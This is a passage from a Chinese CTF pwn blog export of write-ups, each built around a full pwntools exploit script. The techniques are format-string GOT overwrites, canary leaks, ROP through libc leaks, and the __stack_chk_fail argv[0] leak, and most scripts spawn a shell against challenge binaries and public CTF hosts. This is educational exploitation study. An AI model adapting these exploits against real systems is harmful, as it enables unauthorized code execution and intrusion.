class="string">&#x27;b: &#x27;</span> + b)</span><br><span class="line">log.success(<span class="string">&#x27;c: &#x27;</span> + c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a&lt;b <span class="keyword">or</span> b&lt;c:</span><br><span class="line">    log.success(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    execfile(<span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(c,<span class="number">16</span>)-<span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(b,<span class="number">16</span>)-<span class="built_in">int</span>(c,<span class="number">16</span>)) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%14$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(a,<span class="number">16</span>)-<span class="built_in">int</span>(b,<span class="number">16</span>)) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%15$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(strlen_got) + p64(strlen_got+<span class="number">1</span>) + p64(strlen_got+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="hn-写入-2-字节-写入-1-字节"><a href="#hn-写入-2-字节-写入-1-字节" class="headerlink" title="%hn 写入 2 字节 + 写入 1 字节"></a>%hn 写入 2 字节 + 写入 1 字节</h4><p>PS：沿用上面方法得出的数据</p>
<p>发现 system 和 strlen 的真实地址只相差了倒数第二第三，两个字节</p>
<p><img src="/article/Format%20String/image-20211028211620595.png" alt="image-20211028211620595"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;axb_2019_fmt64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26296</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$saaaa&#x27;</span> + p64(puts_got) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_addr = libc_base + libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_got: &#x27;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">log.success(<span class="string">&#x27;strlen_addr: &#x27;</span> + <span class="built_in">hex</span>(strlen_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">low = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;low: &#x27;</span> + <span class="built_in">hex</span>(low))</span><br><span class="line">log.success(<span class="string">&#x27;high: &#x27;</span> + <span class="built_in">hex</span>(high))</span><br><span class="line">log.success(<span class="string">&#x27;strlen_got: &#x27;</span> + <span class="built_in">hex</span>(strlen_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(high-<span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%12$hhn&#x27;</span> <span class="comment"># len = 11</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(low-high) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%13$hn&#x27;</span> <span class="comment"># len = 12</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(strlen_got+<span class="number">2</span>) + p64(strlen_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="n-写入-4-字节"><a href="#n-写入-4-字节" class="headerlink" title="%n 写入 4 字节"></a>%n 写入 4 字节</h4><p>因为写入4字节的字符串长度实在太长，程序容易崩溃，拿上面得到的 strlen 和 system 地址来说，system 地址的后4个字节为 <code>0x70d743a0 = 1893155744</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * sys_addr + <span class="string">&#x27;%7$n&#x27;</span> + p64(printf_got)</span><br></pre></td></tr></table></figure>

<p>就算题目没有限制写入大小的限制，程序读入这么多字符也容易崩溃</p>
<p>此方法不考虑</p>
<p>咕咕咕…</p>
]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Stack Overflow</title>
    <url>/article/Stack%20Overflow/</url>
    <content><![CDATA[<h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><!-- 文章页 配置 -->





<h1 id="保护绕过"><a href="#保护绕过" class="headerlink" title="保护绕过"></a>保护绕过</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Full Relro（重定位表只读）</p>
<p>Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。</p>
<p>无法修改got表</p>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>canary = u64(p.recv(7).rjust(8,’\x00’))</p>
<h3 id="CTFShow04"><a href="#CTFShow04" class="headerlink" title="CTFShow04"></a>CTFShow04</h3><p>先checksec</p>
<p><img src="https://img-blog.csdnimg.cn/2020100514433593.png#pic_center" alt="在这里插入图片描述"></p>
<p>栈不可执行<br>Canary打开</p>
<blockquote>
<p>canary:<br>用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。</p>
</blockquote>
<p>main函数：</p>
<p><img src="https://img-blog.csdnimg.cn/20201005144542442.png#pic_center" alt="在这里插入图片描述"></p>
<p>没有线索，跟进vuln函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>看到v3就是canary了<br>也就是下面的 [ebp-0ch]</p>
<p><img src="https://img-blog.csdnimg.cn/20201005145903257.png#pic_center" alt="在这里插入图片描述"></p>
<p>在vuln函数中canary赋值给了eax<br>我们可以通过在这个赋值之后下一个断点，来获取canary的值<br>在此之前我们需要知道printf函数的地址，用来找到canary的偏移<br>所以要先在printf函数下面下一个断点<br><code>b printf</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005150508325.png#pic_center" alt="在这里插入图片描述"></p>
<p><code>run</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005152146251.png#pic_center" alt="在这里插入图片描述"></p>
<p>可以看到<br>printf函数的地址是 0xffffd0b0</p>
<p>然后在canary赋值之后下一个断点<br>ps：在vuln函数和main函数中都有canary的赋值</p>
<p><img src="https://img-blog.csdnimg.cn/20201005151100579.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201005151126582.png#pic_center" alt="在这里插入图片描述"></p>
<p>这里需要用main函数里面的（我也不知道为什么。。。</p>
<blockquote>
<p>b *0x080486C9</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201005152008443.png#pic_center" alt="在这里插入图片描述"></p>
<p>这样就找到了canary的值<br>之后看printf的地址，找到canary的值，然后算出偏移<br><code>x/40wx 0xffffd0b0</code></p>
<p><img src="https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x<br>canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100</p>
<p><img src="https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28017</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">leak_canary = <span class="string">&quot;%31$x&quot;</span></span><br><span class="line">p.sendline(leak_canary)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&quot;a&quot;</span> * <span class="number">100</span> + p32(canary) + <span class="string">&quot;b&quot;</span> * <span class="number">12</span> + p32(<span class="number">0x0804859B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="NepCTF-easystack-（未解决）"><a href="#NepCTF-easystack-（未解决）" class="headerlink" title="NepCTF easystack （未解决）"></a>NepCTF easystack （未解决）</h3><p>2021.3.25</p>
<p><a href="https://blog.csdn.net/qq_51868336/article/details/115156308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161656332316780261939739%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161656332316780261939739&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-2-115156308.first_rank_v2_pc_rank_v29&utm_term=NepCTF">参考</a></p>
<p>目前看不太懂。。。</p>
<p>官方WriteUp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p= process(<span class="string">&quot;./easystack&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node2.hackingfor.fun&quot;,&#x27;30784&#x27;)</span></span><br><span class="line">exp = <span class="number">0x30</span>*p64(<span class="number">0x6cde20</span>)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0x30应该是0x3a。。。。。不然跑不起来，不知道这个数字怎么来的。。。</p>
<h3 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h3><p>保护</p>
<p><img src="/article/Stack%20Overflow/image-20210414130436078.png" alt="image-20210414130436078"></p>
<p>开了canary</p>
<p><img src="/article/Stack%20Overflow/image-20210414130501122.png" alt="image-20210414130501122"></p>
<p>利用格式化字符串漏洞泄露出canary，在rbp-0x8的位置。。。easy</p>
<p><img src="/article/Stack%20Overflow/image-20210414130934315.png" alt="image-20210414130934315"></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28628)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x400887</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400993</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">addr = (<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>) + p64(addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))   </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x00000000004005f9</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = offset + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>) + p64(addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h3><p>保护</p>
<p><img src="/article/Stack%20Overflow/image-20210422200135619.png" alt="image-20210422200135619"></p>
<p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210422200610913.png" alt="image-20210422200610913"></p>
<p>gets 栈溢出漏洞，可以利用canary的报错输出，</p>
<p>执行 _stack_chk_fail 函数来打印 __libc_argv[0] 指针所指向的字符串（默认存储的是程序的名称），覆盖这个指针，就能泄露出想要的内容了。</p>
<h4 id="stack-chk-fail-的源码"><a href="#stack-chk-fail-的源码" class="headerlink" title="__stack_chk_fail 的源码"></a>__stack_chk_fail 的源码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/article/Stack%20Overflow/image-20210422202048976.png" alt="image-20210422202048976"></p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ul>
<li>覆盖 __libc_argv[0] 为 puts_got 地址，计算出 libcbase</li>
<li>利用 libcbase 计算出 enviorn 地址（enviorn 是环境变量表，里面包含栈地址），用上面的方法泄露出来，即可得到栈的地址</li>
<li>计算 enviorn 与 flag 的偏移，因为flag是保存在栈上的，再用上面的方法泄露出 flag</li>
</ul>
<h4 id="泄露-libc-base"><a href="#泄露-libc-base" class="headerlink" title="泄露 libc_base"></a>泄露 libc_base</h4><p>计算出 输入点 到 __libc_argv[0] 指针的偏移 0x128</p>
<p><img src="/article/Stack%20Overflow/image-20210422201404685.png" alt="image-20210422201404685"></p>
<p>exp。泄露puts_got地址，计算libc_base，泄露 __environ。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts_addr===&gt;&#x27;</span>,<span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">environ_addr = libc_base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base===&gt;&#x27;</span>,<span class="built_in">hex</span>(environ_addr)</span><br></pre></td></tr></table></figure>

<h4 id="泄露stack-addr"><a href="#泄露stack-addr" class="headerlink" title="泄露stack_addr"></a>泄露stack_addr</h4><p>gdb调试，用 x/a _environ 获取当前 environ 地址，search flag 获取在栈上的 flag 的地址</p>
<p><img src="/article/Stack%20Overflow/image-20210422212224024.png" alt="image-20210422212224024"></p>
<blockquote>
<p>0x168</p>
</blockquote>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25259</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./GUESS&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts_addr===&gt;&#x27;</span>,<span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">environ_addr = libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;environ_addr===&gt;&#x27;</span>,<span class="built_in">hex</span>(environ_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr===&gt;&#x27;</span>,<span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">flag_addr = stack_addr - <span class="number">0x168</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/article/Stack%20Overflow/image-20210425115237976.png" alt="image-20210425115237976"></p>
<h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="BJDCTF_2nd r2t4"></a>BJDCTF_2nd r2t4</h3><p>格式化字符串 + _stack_chk_fail</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180634.png" alt="20201223180634"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180812.png" alt="20201223180812"></p>
<p>所以不能利用简单的栈溢出了</p>
<p>发现printf函数有格式化字符串漏洞可以利用</p>
<p>并且程序给了backdoor，地址是：0x400626</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223180855.png" alt="20201223180855"></p>
<p>思路是通过这个漏洞，把 stack_chk_fail 的 got表给改掉，改成 backdoor 的地址，这样当程序发现 canary 被修改去调用 stack_chk_fail 的时候就调用了 backdoor</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181044.png" alt="20201223181044"></p>
<p>手撸出printf格式化字符串的偏移</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201223181608.png" alt="20201223181608"></p>
<p>确定是第六个</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>9=6+3，3是<code>&quot;%64c%9$hn%1510c%10$hnAAA&quot;</code>占了24个比特，也就是3个字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%64c%9$hn           %64c：0x0040（目标地址高位）            %9：更改第九位数字      $hn：两个字节（0000 0000 （八比特））</span><br><span class="line">%1510c%10$hnAAA     %1510c：1510+64&#x3D;0x0626（目标地址低位）  %10：更改第十位数字     $hn：两个字节   AAA:补齐成8的倍数</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h2 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h2><h3 id="NepCTF-给你一朵小红花"><a href="#NepCTF-给你一朵小红花" class="headerlink" title="NepCTF 给你一朵小红花"></a>NepCTF 给你一朵小红花</h3><p>2021.3.25</p>
<p>找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数</p>
<p><img src="/article/Stack%20Overflow/20210325191702.png" alt="20210325191702"></p>
<p><img src="/article/Stack%20Overflow/20210325191953.png" alt="20210325191953"></p>
<p>只要程序返回到这个</p>
<p><img src="/article/Stack%20Overflow/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG" alt="{9A808D7E-F8DA-C99D-776D-F86EB6839E53}"></p>
<p>也就是返回了序号5对应的字符<br>这个时候发送send不要line 下面的内容</p>
<p><img src="/article/Stack%20Overflow/20210325192243.png" alt="20210325192243"></p>
<p><code>p64(0) + p64(1) + b&quot;\xE1&quot;</code></p>
